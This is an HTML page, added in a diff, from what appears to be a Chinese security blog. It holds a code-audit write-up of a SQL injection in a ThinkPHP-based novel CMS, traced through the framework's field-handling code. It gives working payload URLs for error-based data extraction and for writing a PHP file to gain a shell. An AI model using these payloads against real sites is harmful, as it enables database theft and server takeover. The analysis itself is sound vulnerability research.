@@ -1,0 +1,379 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>PHP代码审计—某雨小说CMS注入到Getshell | bewhale&#39;s blog</title>
+
+<link rel="shortcut icon" href="https://bewhale.github.io/favicon.ico?v=1666713403567">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://bewhale.github.io/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+    
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            bewhale&#39;s blog
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/tools" class="menu gt-a-link">
+                    在线工具
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1666713403567"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    PHP代码审计—某雨小说CMS注入到Getshell
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2022-03-20 ·
+                    </time>
+                    
+                        <a href="https://bewhale.github.io/tag/zuB-zqMRV/" class="post-tags">
+                            # PHP代码审计
+                        </a>
+                    
+                        <a href="https://bewhale.github.io/tag/I8zfItXpKf/" class="post-tags">
+                            # ThinkPHP
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="前言">前言</h1>
+<p>论坛有位老哥发了某个基于TP5框架开发的一个小说网站的注入漏洞，</p>
+<p>拿到源码分析一下</p>
+<h1 id="环境搭建">环境搭建</h1>
+<p>CMS版本：1.4.2</p>
+<p>官网地址：</p>
+<p><a href="http://bbs.kyxscms.com/">狂雨小说cms - 狂雨小说cms - Powered by HYBBS (kyxscms.com)</a></p>
+<h1 id="payload">Payload</h1>
+<p>报错:</p>
+<pre><code class="language-html">http://127.0.0.1/?s=api/news/category&amp;cid=updatexml(1,concat(0x7e,user(),0x7e),1)%20--+-
+</code></pre>
+<p>getshell:</p>
+<pre><code class="language-html">// 需要有导出文件权限并且知道绝对路径
+http://127.0.0.1/?s=api/news/category&amp;cid='&lt;?php phpinfo()?&gt;' into outfile '/var/wzww/html/test.php'
+</code></pre>
+<h1 id="漏洞分析">漏洞分析</h1>
+<p>该cms基于ThinkPHP V5.1.33 LTS开发</p>
+<p>漏洞触发点在 <code>\application\api\controller\News.php</code></p>
+<p>category方法获取了三个参数，三个参数可控，重点关注<code>$cid</code></p>
+<pre><code class="language-php">	public function category($cid=false,$type=1,$filter=false){
+		$category=model('api/api')-&gt;category($cid,$type,$filter);
+		return json([&quot;code&quot;=&gt;1,&quot;data&quot;=&gt;$category]);
+	}
+</code></pre>
+<p>跟进 <code>category($cid,$type,$filter)</code> 方法</p>
+<p>这里主要关注<code>get_nav</code>方法的第五个参数，<code>Request::param('cid')</code>,获取了我们传入的<code>$cid</code>参数,</p>
+<p><code>get_nav</code> 第一个参数和第五个参数是一样的，但是只有第五个参数能造成注入</p>
+<p><code>get_nav</code>函数形参只有五个，但是这里传入了六个参数，这里不会报错，多余的参数不做处理</p>
+<p>感觉这里像是故意留的后门。</p>
+<pre><code class="language-php">    public function category($cid,$type,$filter){
+        $api=model('common/api');
+        $api-&gt;api_url=true;
+        $category=$api-&gt;get_nav($cid,$type,$filter,false,Request::param('cid'),'id,title,pid,icon,type');
+        foreach ($category as $key =&gt; $value) {
+            $class[$key]=$value;
+            if($value['branch']==1){
+                $class[$key]['subor']=$this-&gt;category($value['id'],$type,$filter);
+            }
+        }
+        return $class;
+    }
+</code></pre>
+<p>跟进<code>get_nav($cid,$type,$filter,false,Request::param('cid'),'id,title,pid,icon,type')</code>方法</p>
+<p>这里的 <code>$category</code> 和 <code>$field</code> 值是一样的，都是我们传入的 <code>cid</code> 的值, 这里也没进行任何过滤操作，</p>
+<p>where() 函数 采用了pdo预处理，而field()函数并没有，所以造成了注入</p>
+<pre><code class="language-php">	public function get_nav($category,$type,$limit,$cid,$field=true){
+		$map = ['status' =&gt; 1,'pid' =&gt; $category];
+		if($type!==false){
+			$map['type']=$type;
+		}
+        $data=Db::name('category')-&gt;field($field)-&gt;where($map)-&gt;limit($limit)-&gt;order('sort')-&gt;select();
+        ......
+    }
+</code></pre>
+<p>跟进<code>field($field)</code>方法，这里处理的是 知道查询的字段，并没有进行结构化处理，</p>
+<p>如果<code>$field</code>为字符串，并且有<code>[</code>、<code>]</code>、<code>&lt;</code>、<code>'</code>、<code>&quot;</code>、<code>(</code> 字符时，</p>
+<p>调用fieldRaw()方法，将其变成一个查询表达式，并返回，并未进行过滤处理</p>
+<pre><code class="language-php">    /**
+     * 指定查询字段 支持字段排除和指定数据表
+     * @access public
+     * @param  mixed   $field
+     * @param  boolean $except    是否排除
+     * @param  string  $tableName 数据表名
+     * @param  string  $prefix    字段前缀
+     * @param  string  $alias     别名前缀
+     * @return $this
+     */
+    public function field($field, $except = false, $tableName = '', $prefix = '', $alias = '')
+    {
+        if (empty($field)) {
+            return $this;
+        } elseif ($field instanceof Expression) {
+            $this-&gt;options['field'][] = $field;
+            return $this;
+        }
+
+        if (is_string($field)) {
+            if (preg_match('/[\&lt;\'\&quot;\(]/', $field)) {
+                return $this-&gt;fieldRaw($field);
+            }
+
+            $field = array_map('trim', explode(',', $field));
+        }
+
+        if (true === $field) {
+            // 获取全部字段
+            $fields = $this-&gt;getTableFields($tableName);
+            $field  = $fields ?: ['*'];
+        } elseif ($except) {
+            // 字段排除
+            $fields = $this-&gt;getTableFields($tableName);
+            $field  = $fields ? array_diff($fields, $field) : $field;
+        }
+
+        if ($tableName) {
+            // 添加统一的前缀
+            $prefix = $prefix ?: $tableName;
+            foreach ($field as $key =&gt; &amp;$val) {
+                if (is_numeric($key) &amp;&amp; $alias) {
+                    $field[$prefix . '.' . $val] = $alias . $val;
+                    unset($field[$key]);
+                } elseif (is_numeric($key)) {
+                    $val = $prefix . '.' . $val;
+                }
+            }
+        }
+
+        if (isset($this-&gt;options['field'])) {
+            $field = array_merge((array) $this-&gt;options['field'], $field);
+        }
+
+        $this-&gt;options['field'] = array_unique($field);
+
+        return $this;
+    }
+</code></pre>
+<p>然后直接跟进 select() 方法，<code>\thinkphp\library\think\db\Connection.php</code></p>
+<pre><code class="language-php">   /**
+     * 查找记录
+     * @access public
+     * @param Query $query 查询对象
+     * @return array|\PDOStatement|string
+     * @throws DbException
+     * @throws ModelNotFoundException
+     * @throws DataNotFoundException
+     */
+    public function select(Query $query)
+    {
+        // 分析查询表达式
+        $options = $query-&gt;getOptions();
+
+        if (empty($options['fetch_sql']) &amp;&amp; !empty($options['cache'])) {
+            $resultSet = $this-&gt;getCacheData($query, $options['cache'], null, $key);
+
+            if (false !== $resultSet) {
+                return $resultSet;
+            }
+        }
+
+        // 生成查询SQL
+        $sql = $this-&gt;builder-&gt;select($query);
+    	......
+    }
+</code></pre>
+<p>跟进生成查询sql <code>$this-&gt;builder-&gt;select()</code> 方法</p>
+<p><code>\thinkphp\library\think\db\Builder.php</code></p>
+<pre><code class="language-php">    public function select(Query $query)
+    {
+         $options = $query-&gt;getOptions();
+
+        return str_replace(
+            ['%TABLE%', '%DISTINCT%', '%FIELD%', '%JOIN%', '%WHERE%', '%GROUP%', '%HAVING%', '%ORDER%', '%LIMIT%', '%UNION%', '%LOCK%', '%COMMENT%', '%FORCE%'],
+            [
+                $this-&gt;parseTable($query, $options['table']),
+                $this-&gt;parseDistinct($query, $options['distinct']),
+                $this-&gt;parseField($query, $options['field']),
+                $this-&gt;parseJoin($query, $options['join']),
+                $this-&gt;parseWhere($query, $options['where']),
+                $this-&gt;parseGroup($query, $options['group']),
+                $this-&gt;parseHaving($query, $options['having']),
+                $this-&gt;parseOrder($query, $options['order']),
+                $this-&gt;parseLimit($query, $options['limit']),
+                $this-&gt;parseUnion($query, $options['union']),
+                $this-&gt;parseLock($query, $options['lock']),
+                $this-&gt;parseComment($query, $options['comment']),
+                $this-&gt;parseForce($query, $options['force']),
+            ],
+            $this-&gt;selectSql);
+    }
+</code></pre>
+<p>跟进 <code>parseField()</code>方法, 并未对<code>$fields</code> 参数进行任何过滤，也没进行参数绑定结构化查询处理,</p>
+<p>直接替换在了 select 语句后面  所以造成了注入</p>
+<pre><code class="language-php">    protected function parseField(Query $query, $fields)
+    {
+        if ('*' == $fields || empty($fields)) {
+            $fieldsStr = '*';
+        } elseif (is_array($fields)) {
+            // 支持 'field1'=&gt;'field2' 这样的字段别名定义
+            $array = [];
+
+            foreach ($fields as $key =&gt; $field) {
+                if (!is_numeric($key)) {
+                    $array[] = $this-&gt;parseKey($query, $key) . ' AS ' . $this-&gt;parseKey($query, $field, true);
+                } else {
+                    $array[] = $this-&gt;parseKey($query, $field);
+                }
+            }
+
+            $fieldsStr = implode(',', $array);
+        }
+
+        return $fieldsStr;
+    }
+</code></pre>
+<h1 id="参考文章">参考文章</h1>
+<p><a href="https://www.t00ls.cc/thread-64917-1-1.html">某小说cms某处sql注入漏洞</a></p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://bewhale.github.io/post/PHP代码审计—ThinkPHP5.0.10-3.2.3缓存Getshell/" class="post-title gt-a-link">
+                    PHP代码审计—ThinkPHP5.0.10-3.2.3缓存Getshell
+                </a>
+            </div>
+        
+
+        
+
+        
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first"></div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/bewhale" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/bewhale" target="_blank">bewhale</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
